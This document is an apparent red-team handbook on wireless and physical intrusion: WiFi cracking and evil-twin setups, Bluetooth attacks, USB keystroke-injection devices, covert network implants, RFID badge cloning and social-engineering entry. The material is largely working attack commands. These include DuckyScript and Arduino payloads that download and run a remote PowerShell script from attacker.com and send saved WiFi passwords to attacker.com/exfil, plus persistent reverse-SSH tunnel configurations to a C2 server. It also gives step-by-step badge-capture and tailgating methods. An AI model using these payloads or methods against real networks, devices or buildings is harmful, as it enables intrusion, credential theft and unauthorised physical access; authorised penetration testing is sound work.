# Wireless & Physical Access Attacks

> **MITRE ATT&CK Mapping**: T1200 (Hardware Additions), T1091 (Replication Through Removable Media), T1587.001 (Develop Capabilities: Malware)
> **Tactic**: Initial Access
> **Platforms**: Windows, Linux, macOS, Network Infrastructure, IoT, Physical Access Control Systems
> **Required Permissions**: Varies (physical proximity required; no host-level permissions for wireless; local admin for USB implants)
> **OPSEC Risk**: Medium to High (RF emissions are detectable; physical presence increases exposure; USB implants leave forensic artifacts)

---

## Strategic Overview

Wireless and physical attacks represent the most direct path into a target environment when remote
exploitation proves infeasible or when engagement rules of engagement specifically include physical
security assessment. These attack vectors exploit the fundamental trust boundary between the physical
world and digital infrastructure -- a boundary that many organizations neglect in favor of
perimeter-focused network defenses. During red team operations, wireless attacks (WiFi, Bluetooth,
RFID/NFC) and physical implant deployment can provide initial access that bypasses entirely the
hardened internet-facing perimeter, VPN gateways, and zero-trust network architectures.

The 2025 threat landscape has seen significant evolution in physical attack tooling. The Flipper Zero
ecosystem has matured into a serious multi-protocol assessment platform, new firmware for the
Proxmark3 has expanded badge-cloning capabilities, and HID attack devices like the O.MG Cable now
feature geofencing and WiFi-based command-and-control. Simultaneously, defensive technologies have
advanced: WPA3-SAE adoption is increasing, modern access control systems are migrating to encrypted
credentials (SEOS, DESFire EV3), and USB device whitelisting policies are more common. Red team
operators must understand both the offensive capabilities and the defensive landscape to execute
engagements effectively and provide actionable recommendations.

Physical penetration testing combines technical wireless exploitation with social engineering,
lock bypass, and covert device placement. A successful physical engagement often chains multiple
techniques: badge cloning to enter a building, rogue device placement on the internal network,
and WiFi-based exfiltration for command-and-control. This document covers the full spectrum from
WiFi protocol attacks through physical entry and network implant deployment.

---

## 1. WiFi Attacks

### 1.1 WPA2-PSK Attacks

#### PMKID Capture (Clientless Attack)

The PMKID attack, disclosed by the Hashcat team in 2018, remains one of the most efficient methods
for attacking WPA2-PSK networks in 2025. Unlike traditional handshake capture, PMKID extraction
does not require a connected client -- only a single frame from the access point.

**How it works:**
The PMKID is derived as: `PMKID = HMAC-SHA1-128(PMK, "PMK Name" || MAC_AP || MAC_STA)`. When a
client sends an association request with RSN PMKID list capabilities, the AP responds with the
PMKID in the first EAPOL message. The attacker can solicit this without completing the handshake.

**Toolchain:**
```bash
# Step 1: Identify target network and capture PMKID
# hcxdumptool requires monitor mode interface
sudo hcxdumptool -i wlan0mon -o capture.pcapng --active_beacon --enable_status=15

# Step 2: Convert capture to hashcat-compatible format
hcxpcapngtool -o hash.22000 capture.pcapng

# Step 3: Crack with hashcat (mode 22000 = WPA-PMKID-PBKDF2)
hashcat -m 22000 hash.22000 wordlist.txt -r rules/best64.rule

# GPU cracking performance (approximate, RTX 4090):
# WPA2-PBKDF2: ~2.5 million PMKs/second
# With multiple GPUs or cloud instances, large wordlists become feasible
```

**Key considerations:**
- Not all APs respond with PMKID; success rate varies by vendor and firmware
- WPA3-only networks are immune to PMKID capture
- PMKID is tied to the specific MAC addresses, so it must be cracked per AP/client pair

#### 4-Way Handshake Capture

The traditional approach requires capturing the 4-way EAPOL handshake between a legitimate client
and the access point.

```bash
# Start monitor mode
sudo airmon-ng start wlan0

# Capture traffic on target channel
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Force client reconnection via deauthentication (separate terminal)
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Verify handshake captured
aircrack-ng capture-01.cap

# Crack with hashcat (convert first)
hcxpcapngtool -o hash.22000 capture-01.cap
hashcat -m 22000 hash.22000 rockyou.txt
```

#### GPU Cracking Infrastructure

For complex passphrases, dedicated GPU cracking rigs or cloud instances dramatically accelerate
the attack:

| GPU               | WPA2 PBKDF2 Speed  | Estimated Time (8-char complex) |
|-------------------|---------------------|---------------------------------|
| RTX 4090          | ~2.5M PMK/s         | Days to weeks                  |
| 4x RTX 4090       | ~10M PMK/s          | Hours to days                  |
| Cloud (8x A100)   | ~20M PMK/s          | Hours                          |

Rule-based attacks with hashcat rules (dive.rule, OneRuleToRuleThemAll) combined with targeted
wordlists (company name variations, address, phone numbers) are far more effective than pure
brute force.

### 1.2 WPA2-Enterprise Attacks

WPA2-Enterprise (802.1X) uses RADIUS authentication, typically with EAP methods (PEAP, EAP-TLS,
EAP-TTLS). Attacks target the authentication process rather than a shared key.

#### Evil Twin with hostapd-mana / eaphammer

```bash
# Using eaphammer for automated evil twin with credential capture
# Generate certificates mimicking the target organization
eaphammer --cert-wizard

# Launch evil twin targeting PEAP networks
eaphammer -i wlan0 --auth wpa-enterprise --essid "CorpWiFi" \
  --creds --negotiate balanced

# Using hostapd-mana for more granular control
# hostapd-mana extends hostapd with credential logging,
# karma attacks, and EAP downgrade capabilities
hostapd-mana /etc/hostapd-mana/hostapd-mana.conf
```

#### EAP Downgrade Attacks

When the target uses PEAP-MSCHAPv2, the captured challenge/response can be cracked offline.
More aggressive attacks downgrade the EAP inner method:

- **GTC Downgrade**: Force clients to use EAP-GTC instead of MSCHAPv2, capturing plaintext
  credentials. Works when clients do not validate the EAP inner method.
- **PEAP Relay**: Relay the EAP authentication to a legitimate RADIUS server, acting as a
  man-in-the-middle.
- **Certificate Abuse**: If clients do not validate server certificates (common misconfiguration),
  the evil twin presents its own certificate and captures credentials.

#### RADIUS Credential Capture

Captured MSCHAPv2 challenge/response pairs from PEAP connections can be cracked:
```bash
# Convert captured credentials to hashcat format
# MSCHAPv2 hash format: user:::challenge:response:peer_challenge
hashcat -m 5500 captured_netntlmv1.txt wordlist.txt

# For NetNTLMv2 (from inner PEAP):
hashcat -m 5600 captured_netntlmv2.txt wordlist.txt
```

### 1.3 WPA3 Attacks

WPA3 replaces PSK with SAE (Simultaneous Authentication of Equals), based on the Dragonfly
key exchange. While significantly more secure, vulnerabilities exist.

#### Dragonblood Vulnerabilities (CVE-2019-9494 through CVE-2019-9499)

The Dragonblood research by Mathy Vanhoef and Eyal Ronen identified several classes of
vulnerabilities in WPA3-SAE implementations:

- **Transition Mode Downgrade**: When a network operates in WPA3-Transition mode (supporting
  both WPA2 and WPA3 simultaneously), attackers can force clients to connect via WPA2 by
  setting up a rogue AP that only advertises WPA2 support. The client falls back to WPA2-PSK,
  enabling traditional PMKID/handshake capture and offline cracking.

```bash
# DragonShift -- automates WPA3 transition mode downgrade
# Sets up rogue AP advertising only WPA2 with target SSID
# Forces WPA3-capable clients to downgrade
python3 dragonshift.py -i wlan0mon -t "TargetNetwork" --downgrade
```

- **Group Downgrade Attack**: The SAE group negotiation is not cryptographically protected.
  An attacker can force the use of weaker elliptic curve groups.

- **Side-Channel Attacks**: Timing and cache-based side channels in the SAE handshake
  implementation leak information about the password. These require local access to the AP
  or client and are more theoretical in practice.

- **Denial of Service**: SAE's commit phase requires expensive elliptic curve operations.
  Flooding an AP with commit frames exhausts CPU resources, degrading or denying service.

**2025 Status**: Most major vendors have patched the original Dragonblood vulnerabilities.
However, transition mode downgrade remains viable against networks that support both WPA2
and WPA3 simultaneously -- which is the most common deployment model in enterprise environments
during the migration period.

#### WiFi 6/6E Considerations

WiFi 6 (802.11ax) and WiFi 6E (6 GHz band) introduce additional considerations:

- **6 GHz band**: WPA3-SAE is mandatory on 6 GHz; no WPA2 fallback. Pure WPA3 networks on
  6 GHz are immune to transition mode downgrade.
- **Target Wake Time (TWT)**: New power-saving mechanism that affects deauth timing.
- **BSS Coloring**: Helps identify transmissions from different BSSs; does not impact attacks.
- **Enhanced Open (OWE)**: Opportunistic Wireless Encryption for open networks provides
  encryption without authentication, preventing passive eavesdropping on open networks.
- **Operating on 6 GHz requires compatible hardware**: Alfa AWUS036AXML or similar 802.11ax
  adapters with monitor mode support.

### 1.4 Rogue AP / Evil Twin

Rogue access points mimic legitimate networks to intercept client connections.

```bash
# Basic hostapd evil twin configuration
cat > /etc/hostapd/evil_twin.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=FreeWiFi
channel=6
hw_mode=g
ieee80211n=1
wpa=0
EOF

# Launch with captive portal for credential harvesting
sudo hostapd /etc/hostapd/evil_twin.conf &
sudo dnsmasq -C /etc/dnsmasq_evil.conf &
# Redirect all HTTP to credential capture portal
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
```

#### Karma Attacks

Karma attacks respond to any probe request from clients, impersonating whatever SSID the
client is looking for. This exploits the behavior of devices that probe for previously connected
networks.

- **hostapd-mana**: Supports karma mode natively via `enable_mana=1`
- **WiFi Pineapple**: Built-in PineAP module implements karma and beacon flooding
- **Bettercap**: `wifi.recon` and `wifi.ap` modules support karma-like behavior

### 1.5 WiFi Deauthentication

Deauthentication frames in 802.11 are unauthenticated management frames that can be spoofed
to disconnect clients.

```bash
# Targeted deauthentication with aireplay-ng
sudo aireplay-ng -0 10 -a <AP_BSSID> -c <CLIENT_MAC> wlan0mon

# Broadcast deauthentication
sudo aireplay-ng -0 0 -a <AP_BSSID> wlan0mon

# MDK4 -- more sophisticated deauth and disruption
sudo mdk4 wlan0mon d -B <AP_BSSID>       # Deauthentication
sudo mdk4 wlan0mon a -a <AP_BSSID>       # Authentication flood
sudo mdk4 wlan0mon b -c 6                # Beacon flood on channel 6
```

**802.11w (Management Frame Protection)**: WPA3 mandates 802.11w, which cryptographically
protects management frames including deauthentication. On WPA3-only networks, deauth attacks
are ineffective. On WPA2 or transition mode networks, deauth remains viable.

### 1.6 Post-Connection MITM

Once a client connects through the rogue AP, the attacker has a man-in-the-middle position:

```bash
# ARP spoofing with arpspoof
sudo arpspoof -i wlan0 -t <target_ip> <gateway_ip>

# Bettercap for comprehensive MITM
sudo bettercap -iface wlan0
> net.probe on
> set arp.spoof.targets 192.168.1.0/24
> arp.spoof on
> set net.sniff.verbose true
> net.sniff on

# SSL stripping (less effective in 2025 due to HSTS preloading)
> set http.proxy.sslstrip true
> http.proxy on
```

**2025 Reality**: HSTS preloading and certificate transparency make SSL stripping increasingly
difficult against major services. However, many internal enterprise applications, IoT devices,
and legacy systems still use HTTP or improperly configured HTTPS, making MITM valuable in
internal network contexts.

---

## 2. Bluetooth Attacks

### 2.1 BLE Enumeration and Reconnaissance

Bluetooth Low Energy (BLE) is ubiquitous in IoT devices, access control peripherals, wireless
keyboards, and medical devices.

```bash
# BLE scanning with hcitool
sudo hcitool lescan

# Detailed enumeration with bettercap
sudo bettercap
> ble.recon on
> ble.show              # List discovered BLE devices
> ble.enum <mac>        # Enumerate services and characteristics

# gatttool for interactive GATT exploration
gatttool -b <MAC_ADDRESS> -I
> connect
> primary               # List primary services
> characteristics       # List characteristics
> char-read-hnd 0x0003  # Read characteristic by handle

# nRF Connect (Android/iOS) for field reconnaissance
# Provides GUI-based GATT exploration, advertising data parsing,
# and service identification
```

### 2.2 Known Bluetooth Vulnerabilities

#### BlueBorne (CVE-2017-1000251 and related)

A family of vulnerabilities allowing remote code execution over Bluetooth without pairing.
Affects Linux, Android, Windows, and iOS. While largely patched, older/unpatched devices in
corporate environments (printers, conference room systems, IoT) may remain vulnerable.

#### KNOB Attack (CVE-2019-9506)

The Key Negotiation of Bluetooth (KNOB) attack exploits the entropy negotiation in Bluetooth
BR/EDR. An attacker can downgrade the session key entropy to 1 byte, making brute force
trivial. The attack is standard-compliant -- it exploits a design flaw, not an implementation
bug.

```
Attack flow:
1. Attacker positions between two paired Bluetooth devices
2. During LMP (Link Manager Protocol) negotiation, attacker modifies
   the entropy field to request 1-byte key
3. Both devices accept (specification allows 1-7 bytes)
4. Session key has only 256 possible values -- brute force in milliseconds
5. Attacker can decrypt and inject traffic
```

#### BIAS Attack (Bluetooth Impersonation Attacks)

BIAS exploits the authentication procedure in Bluetooth BR/EDR. An attacker can impersonate
a previously paired device without possessing the link key. Combined with KNOB, this creates
a powerful attack chain: impersonate a device (BIAS) then downgrade encryption (KNOB) to
achieve full traffic interception.

### 2.3 BLE Relay Attacks

BLE relay attacks extend the effective range of proximity-based authentication systems by
relaying BLE communication between a legitimate token (badge, phone) and a reader.

**Application**: Bypassing BLE-based door access control or vehicle entry systems where
the legitimate owner is some distance away. Two devices (one near the victim's BLE token,
one near the target reader) relay GATT traffic over a network link.

**Tools**: Custom firmware on ESP32 or nRF52 boards, GATTacker framework, BLE-Relay tools.

### 2.4 Bluetooth Sniffing with Ubertooth

The Ubertooth One is an open-source 2.4 GHz development platform optimized for Bluetooth
monitoring:

```bash
# BLE sniffing (promiscuous mode)
ubertooth-btle -f -c capture.pcap

# Follow a specific connection
ubertooth-btle -t <TARGET_MAC>

# Classic Bluetooth basic rate sniffing
# Note: Following BR/EDR hopping sequences is limited
ubertooth-btbb -l

# Pipe to Wireshark for real-time analysis
ubertooth-btle -f | wireshark -k -i -
```

**Limitations**: Ubertooth has difficulty following classic Bluetooth adaptive frequency
hopping at full speed but excels at BLE monitoring. For classic Bluetooth, professional
analyzers (Ellisys, Frontline) provide better coverage but cost significantly more.

---

## 3. HID Attacks

Human Interface Device (HID) attacks exploit the fundamental trust that operating systems
place in USB keyboards and mice. When a USB device identifies itself as a keyboard, the OS
accepts keystrokes without authentication.

### 3.1 USB Rubber Ducky

The Hak5 USB Rubber Ducky is the canonical HID attack device. The current generation supports
DuckyScript 3.0 with advanced features including conditional logic, variables, and keystroke
reflection.

#### DuckyScript Payloads

```duckyscript
REM Reverse shell payload -- Windows target
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://attacker.com/shell.ps1')"
ENTER

REM WiFi credential exfiltration
DELAY 1000
GUI r
DELAY 500
STRING cmd /k "netsh wlan show profiles | findstr /i profile > %TEMP%\w.txt && for /f \"tokens=2 delims=:\" %a in (%TEMP%\w.txt) do netsh wlan show profile name=%a key=clear >> %TEMP%\wifi.txt && powershell -c \"Invoke-WebRequest -Uri https://attacker.com/exfil -Method POST -Body (Get-Content $env:TEMP\wifi.txt -Raw)\""
ENTER

REM Credential harvester -- fake Windows lock screen
DELAY 1000
GUI l
DELAY 2000
REM Type credentials into fake login prompt that sends to attacker
```

### 3.2 Bash Bunny

The Bash Bunny extends the Rubber Ducky concept with a full Linux computer that can
simultaneously emulate multiple USB device types.

**Attack Modes:**
- **HID + Storage**: Present as a keyboard while also mounting as USB storage
- **HID + Ethernet**: Keystroke injection plus network interface for MITM
- **Storage + Ethernet**: Dual network/storage for data exfiltration
- **Serial**: For interacting with serial consoles and embedded devices

```bash
# Bash Bunny payload structure (payload.txt)
#!/bin/bash
# BashBunny QuickCreds -- capture NTLM hashes via Responder
ATTACKMODE RNDIS_ETHERNET HID
LED SETUP
# Start Responder on the Bash Bunny's network interface
python /tools/responder/Responder.py -I usb0 -wrf &
# Use HID to open network connections dialog and trigger authentication
QUACK GUI r
QUACK DELAY 500
QUACK STRING \\\\$(cat /tmp/bb_ip)\share
QUACK ENTER
LED ATTACK
# Wait for credentials
sleep 30
LED FINISH
```

### 3.3 O.MG Cable

The O.MG Cable (created by security researcher MG / Mike Grover) is a USB cable with an
embedded WiFi-enabled microcontroller, indistinguishable from a standard charging cable.

**Capabilities (2025 generation):**
- **Keystroke injection**: Full HID keyboard emulation through a normal-looking cable
- **WiFi C2**: Built-in WiFi access point for remote payload triggering and management
- **Geofencing**: Payloads can be configured to trigger only when the device is in a
  specific geographic location (based on nearby WiFi networks)
- **Remote triggering**: Operator can trigger payloads from a separate WiFi connection
  without being physically present
- **Self-destruct**: Can erase payload and revert to functioning as a normal cable
- **Keylogging**: When used as a pass-through between a keyboard and computer, logs all
  keystrokes and exfiltrates over WiFi
- **Exfiltration**: Can exfiltrate data over WiFi C2 channel

**Operational use**: The O.MG Cable is ideal for scenarios where a USB device would raise
suspicion but a charging cable would not. Drop scenarios include conference rooms, shared
workspaces, or supply chain insertion.

### 3.4 DIY HID Devices

#### DigiSpark / ATtiny85

Budget HID attack device (~$2 per unit). Programmable via Arduino IDE:

```cpp
// DigiSpark reverse shell payload (Arduino)
#include "DigiKeyboard.h"
void setup() {
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell -w hidden -nop -c \"IEX(IWR https://attacker.com/s.ps1)\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}
void loop() {}
```

#### Arduino Leonardo / Teensy

More capable than DigiSpark with faster keystroke injection and support for both keyboard
and mouse emulation. Teensy boards support complex payloads with conditional logic and
multiple HID profiles.

### 3.5 BadUSB

BadUSB attacks reprogram the firmware of standard USB devices (flash drives, phones, peripherals)
to present as HID devices. Unlike dedicated attack hardware, BadUSB turns existing trusted
devices into attack platforms:

- **Phison 2251-03 controller**: Well-documented firmware modification for USB flash drives
- **Rubber Ducky firmware on commodity hardware**: Open-source projects that flash Ducky-like
  firmware onto cheap USB development boards
- **Android phone as HID**: NetHunter and USB Gadget API allow Android phones to emulate HID
  devices when connected via USB

**Defense**: USB device whitelisting (e.g., USB Raptor, Windows Group Policy for allowed USB
device classes), USB port blockers, and endpoint detection of rapid keystroke injection patterns.

---

## 4. Network Implants

Network implants are covert devices placed on the target's physical network to provide
persistent remote access.

### 4.1 LAN Turtle

The Hak5 LAN Turtle is a covert network implant disguised as a generic USB Ethernet adapter.
It plugs inline between a network jack and a computer, providing transparent network access.

**Key Modules:**
- **AutoSSH**: Establishes persistent reverse SSH tunnels to an attacker-controlled server
- **Responder**: Captures NTLM hashes from network traffic (LLMNR/NBT-NS poisoning)
- **DNS Spoofing**: Redirects DNS queries to attacker-controlled servers
- **URLSnarf**: Logs HTTP URLs from network traffic
- **Meterpreter**: Deploys Metasploit payloads

```bash
# LAN Turtle reverse SSH tunnel configuration
# On the LAN Turtle:
autossh -M 0 -o "ServerAliveInterval 30" -o "ServerAliveCountMax 3" \
  -R 2222:localhost:22 attacker@c2server.com -N -f

# On attacker machine -- access the target network:
ssh -p 2222 root@localhost           # SSH into LAN Turtle
ssh -D 9050 -p 2222 root@localhost   # SOCKS proxy into target network
```

### 4.2 Packet Squirrel

The Packet Squirrel provides inline network interception capabilities:

- **PCAP Capture**: Records all traffic passing through to USB storage
- **DNS Spoofing**: Selective DNS redirection
- **VPN Tunnel**: Routes all captured traffic through VPN for remote analysis
- **Transparent Bridge**: Operates without disrupting network connectivity

### 4.3 Shark Jack

Portable network attack device optimized for fast reconnaissance:

```bash
# Shark Jack payload -- rapid network scan and exfil
#!/bin/bash
NETMODE DHCP_CLIENT
LED SETUP
sleep 5
# Run nmap scan
nmap -sn $(ip route | grep default | awk '{print $3}' | sed 's/\.[0-9]*$/.0\/24/') \
  -oX /root/loot/scan_$(date +%s).xml
LED FINISH
```

### 4.4 Raspberry Pi Dropbox

A Raspberry Pi configured as a network implant provides maximum flexibility:

**Build components:**
- Raspberry Pi Zero 2W or Pi 4 (depending on requirements)
- USB Ethernet adapter or PoE HAT for wired network connectivity
- 4G/LTE USB modem for out-of-band C2 (avoids detection on target network)
- Small form factor case; disguise as legitimate device (USB charger, IoT sensor)

**Configuration essentials:**
```bash
# Persistent reverse SSH tunnel via systemd service
[Unit]
Description=Reverse SSH Tunnel
After=network-online.target
Wants=network-online.target

[Service]
ExecStart=/usr/bin/autossh -M 0 -o "ServerAliveInterval 30" \
  -o "StrictHostKeyChecking no" -N -R 4444:localhost:22 \
  user@c2server.com -i /root/.ssh/id_rsa
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
```

**WiFi callback**: Configure the Pi to connect to a mobile hotspot as a fallback C2 channel
if the wired connection is monitored or blocked.

### 4.5 WiFi Pineapple

The WiFi Pineapple Mark VII is a purpose-built wireless auditing platform:

- **PineAP**: Advanced rogue AP engine with karma, beacon flooding, and targeted association
- **Recon Dashboard**: Real-time client and AP enumeration
- **Campaign System**: Automated multi-stage wireless attacks
- **Cloud C2**: Remote management via Hak5 Cloud C2 infrastructure
- **Module Ecosystem**: Community-developed modules for specific attack scenarios
- **Enterprise Edition**: Dual-band 802.11ac with extended range

**Operational deployment**: The WiFi Pineapple can be placed in a drop ceiling, behind
furniture, or in a server room to provide long-term wireless attack capability with remote
management via Cloud C2.

---

## 5. RFID / NFC Attacks

### 5.1 Proxmark3

The Proxmark3 is the gold standard for RFID/NFC security research. The RDV4 and Easy variants
support both low-frequency (125 kHz) and high-frequency (13.56 MHz) protocols.

#### Low-Frequency Badge Cloning

```bash
# Read HID Prox card (125 kHz)
proxmark3> lf hid reader
# Output: HID Prox TAG ID: 2006EC0C77 (H10301) - FC: 110 CN: 1234

# Clone to T5577 writable card
proxmark3> lf hid clone --r 2006EC0C77

# Read EM410x card
proxmark3> lf em 410x reader
# Output: EM410x ID: 0400193AB5

# Clone EM410x to T5577
proxmark3> lf em 410x clone --id 0400193AB5
```

#### MIFARE Classic Cracking

MIFARE Classic uses the CRYPTO1 cipher, which has been thoroughly broken:

```bash
# Identify card type
proxmark3> hf search

# Check for default keys
proxmark3> hf mf chk --1k

# Nested attack (requires one known key)
proxmark3> hf mf nested --1k --blk 0 -a -k FFFFFFFFFFFF

# Hardnested attack (when no default keys work)
# Requires one known key sector; attacks other sectors
proxmark3> hf mf hardnested --blk 0 -a -k FFFFFFFFFFFF --tblk 4 --ta

# Dump entire card
proxmark3> hf mf dump

# Clone to a MIFARE Classic compatible card (UID-writable "magic" card)
proxmark3> hf mf cload -f dump.bin
```

#### iCLASS Attacks

```bash
# Read iCLASS card
proxmark3> hf iclass reader

# iCLASS Standard/Legacy -- use default key attack
proxmark3> hf iclass dump --ki 0

# iCLASS Elite -- requires loclass attack or key recovery
proxmark3> hf iclass loclass

# Clone to writable iCLASS card
proxmark3> hf iclass clone --cc <credential_data>
```

**2025 Note**: Legacy HID Prox, EM410x, MIFARE Classic, and iCLASS Standard/Legacy cards
remain widely deployed and are trivially cloned. Modern systems using SEOS, DESFire EV2/EV3,
or iCLASS SE with Elite keys provide significantly stronger protection. During reconnaissance,
identifying the card technology in use is critical for determining attack viability.

### 5.2 Flipper Zero

The Flipper Zero has evolved from a hobbyist toy into a legitimate red team tool with its
multi-protocol capabilities and active firmware development community.

**Supported protocols and attack capabilities:**

| Module     | Frequency     | Supported Protocols                        |
|------------|---------------|--------------------------------------------|
| Sub-GHz    | 300-928 MHz   | Garage doors, key fobs, weather stations   |
| RFID (LF)  | 125 kHz       | EM4100, HID Prox, Indala, AWID             |
| NFC (HF)   | 13.56 MHz     | MIFARE Classic/UL, NTAG, ISO 14443         |
| IR         | Infrared      | TV/AC remotes, universal codes             |
| iButton    | 1-Wire        | DS1990A, Cyfral, Metakom                   |
| GPIO/BadUSB| USB HID       | Keystroke injection, DuckyScript-compatible |

**2025 Firmware ecosystem:**
- **Official firmware**: Regular updates with new protocol support
- **Unleashed firmware**: Removes Sub-GHz transmission restrictions, adds protocols
- **Xtreme firmware**: Additional features and UI customization
- **RFIDThief board**: Custom add-on bridging Flipper Zero with ESP-RFID-Tool for
  real-time RFID credential capture and exfiltration from Wiegand readers

**Red team applications:**
```
1. Badge cloning: Read employee badge in close proximity (elevator, meeting),
   clone to writable card, use for building access
2. Sub-GHz replay: Capture and replay garage door/gate signals (non-rolling code)
3. BadUSB: DuckyScript payloads via USB connection
4. IR: Disable security cameras, manipulate displays, control TVs in lobbies
5. NFC: Read and emulate NFC-based access cards
6. iButton: Clone intercom and door access tokens
```

**Limitations:**
- Cannot break rolling code systems (modern garage doors, car key fobs)
- Cannot clone DESFire, SEOS, or iCLASS SE (encrypted, mutual authentication)
- Sub-GHz range limited; not a replacement for dedicated SDR equipment
- MIFARE Classic attacks are basic compared to Proxmark3 capabilities

### 5.3 NFC Relay Attacks

NFC relay attacks defeat proximity-based security by transparently relaying communication
between a card and reader over an arbitrary distance.

**Setup:**
1. **Mole device** (near victim's card): Proxmark3, Android phone with NFC, or custom hardware
2. **Proxy device** (near target reader): Second Proxmark3 or NFC-capable device
3. **Communication link**: WiFi, Bluetooth, cellular, or internet connection between devices

```bash
# Proxmark3 relay mode
# Terminal 1 (reader-side proxy):
proxmark3> hf 14a relay reader

# Terminal 2 (card-side mole):
proxmark3> hf 14a relay card

# Connect both via network link
```

**Application**: An operator near a target door reader relays NFC authentication to a
second operator near the badge holder (in a cafeteria, elevator, parking lot). The reader
sees a valid card authentication despite the actual card being remote.

**Defenses**: Distance bounding protocols, transaction timing analysis, and challenge-response
mechanisms that detect relay latency.

### 5.4 Badge Cloning Methodology

A structured approach for physical access card assessment:

```
Phase 1: Reconnaissance
  - Identify card technology (visual inspection: HID logo, MIFARE markings)
  - Photograph card readers (brand, model helps identify protocol)
  - Observe card usage patterns (tap vs. insert, beep/LED patterns)
  - Long-range RFID reconnaissance (high-gain antenna, covert reader)

Phase 2: Capture
  - Close-proximity read with Flipper Zero or Proxmark3
  - Social engineering: "Can I see your badge for a moment?"
  - Covert reader: Custom reader hidden in a bag or clipboard
  - Reader tap (RFIDThief): Install covert reader on existing reader

Phase 3: Analysis & Cloning
  - Identify encoding format (Wiegand 26-bit, iCLASS, MIFARE sector data)
  - Clone to appropriate writable card/fob
  - For MIFARE Classic: run key recovery, dump, and clone all sectors
  - For HID Prox/EM410x: direct clone to T5577

Phase 4: Testing
  - Test cloned card on non-critical reader first
  - Verify access levels match the original badge
  - Confirm cloned card does not trigger alerts
  - Have legitimate-looking badge holder ready for visual inspection
```

---

## 6. Physical Penetration Techniques

### 6.1 Lock Bypass

While lock picking is a specialized skill, red team operators should have basic capabilities:

- **Lock picking**: Standard pin tumbler locks, wafer locks on server racks
- **Bump keys**: Pre-cut keys that exploit pin tumbler mechanics
- **Shims**: Bypass padlock shackle mechanisms
- **Under-door tools**: Reach interior door handles from outside
- **Latch slipping**: Credit card or shim to slip spring-loaded latches
- **Bypass tools**: Specialized tools for specific lock models (e.g., Abloy, Medeco bypass)

**Key considerations**: Always have written authorization. Photo-document all entry methods.
Many jurisdictions have laws regarding possession of lock picking tools.

### 6.2 Social Engineering at Entry Points

- **Tailgating/Piggybacking**: Following authorized personnel through secured doors.
  Most effective during high-traffic periods (morning arrival, lunch return).
- **Impersonation**: IT support, delivery driver, fire inspector, HVAC technician.
  Pre-text must be well-researched and supported with props (uniform, clipboard, work order).
- **Pretexting at reception**: "I'm here for a meeting with [name from LinkedIn]."
  Carry a laptop bag and dress appropriately for the target organization.
- **Vendor impersonation**: Many organizations have regular vendor visits. Identifying
  vendor names from LinkedIn, job postings, or dumpster diving enables impersonation.

### 6.3 Dumpster Diving

Valuable items found in organizational waste:

- Network diagrams, IP addresses, system names
- Printed credentials, password reset forms
- Employee directories and organizational charts
- Discarded badges and access cards
- Hardware with data (hard drives, USB drives)
- Shredded documents (cross-cut shredders are more secure; strip-cut is reconstructable)

### 6.4 Network Jack Discovery and Rogue Device Placement

```
Methodology:
1. Locate network jacks in common areas:
   - Conference rooms (often behind tables or in floor boxes)
   - Lobbies and waiting areas
   - Break rooms and kitchens
   - Printer/copier alcoves
   - Under desks in hot-desking areas
2. Test jacks for active network connectivity
3. Deploy implant (LAN Turtle, Packet Squirrel, or Raspberry Pi)
4. Verify C2 callback from implant
5. Disguise device (USB charger, power adapter, behind equipment)
6. Document placement location for retrieval
```

---

## 2025 Techniques and Developments

### Flipper Zero RFIDThief Module

A 2025 hardware add-on that bridges the Flipper Zero with the ESP-RFID-Tool platform, enabling
real-time credential capture from Wiegand-protocol readers. The module can be installed inline
on an existing door reader, capturing all badge swipes and storing them locally or exfiltrating
over WiFi. This represents a significant advancement in covert credential harvesting for
physical assessments.

### WiFi 6E Monitoring Capabilities

New monitor-mode capable WiFi 6E adapters (supporting the 6 GHz band) are becoming available
for penetration testing. These are essential as organizations deploy 6 GHz-only networks,
which require WPA3-SAE and present different attack surfaces than legacy bands.

### O.MG Elite Cable (2025)

The latest O.MG Cable generation includes improved WiFi range, faster keystroke injection,
enhanced geofencing via WiFi fingerprinting, and improved self-destruct capabilities. The
keylogging pass-through mode now supports USB-C natively.

### AI-Assisted WiFi Cracking

Cloud-based GPU instances and AI-assisted password generation are improving the success rate
of WPA2 cracking. Large language models trained on breach data can generate targeted wordlists
that are significantly more effective than traditional dictionary attacks.

### iCopy-X for Rapid Badge Cloning

The iCopy-X device (built on Proxmark3 technology) provides a standalone, portable badge
cloning solution with a touchscreen interface. It automates the identification, key recovery,
and cloning process for MIFARE Classic, HID iCLASS, and low-frequency cards without requiring
a laptop or command-line expertise.

### ESPKey + Long-Range RFID Reader (Modern Tastic Thief)

The classic Bishop Fox Tastic RFID Thief relied on an Arduino and SD card to log badge data
from a covert long-range reader. The modern approach replaces the Arduino with an **ESPKey** --
a postage-stamp-sized board that crimps directly onto the Power, Neutral, and Wiegand data
wires inside any RFID badge reader (including portable long-range readers).

**Key advantages over the original Tastic Thief:**
- **WiFi-based data retrieval**: Badge data is accessible via the ESPKey's web interface over
  WiFi rather than physically retrieving an SD card -- critical for persistent installations
  where physical access after deployment is limited
- **Hardware agnostic**: Because ESPKey intercepts Wiegand protocol data at the wire level,
  it works with both low-frequency (125 kHz HID Prox, EM410x) and high-frequency (13.56 MHz
  iCLASS, MIFARE) long-range readers
- **Real-time capture**: Badge data is available immediately upon swipe rather than requiring
  post-operation SD card retrieval
- **Read range**: With a long-range reader housing, badge reads are possible at 3+ feet --
  sufficient for capturing credentials as targets walk past in hallways or through doorways

**Deployment methodology:**
```
1. Acquire a compatible long-range RFID reader (HID MaxiProx, custom gooseneck build)
2. Open the reader housing and identify the Wiegand data lines (D0, D1) and power
3. Crimp the ESPKey inline on the Wiegand data wires and power
4. Configure ESPKey WiFi (AP mode for covert retrieval, client mode for exfiltration)
5. Conceal the assembled reader in a bag, briefcase, or mounted covertly near an entry point
6. Monitor captured badge data via ESPKey web interface or API
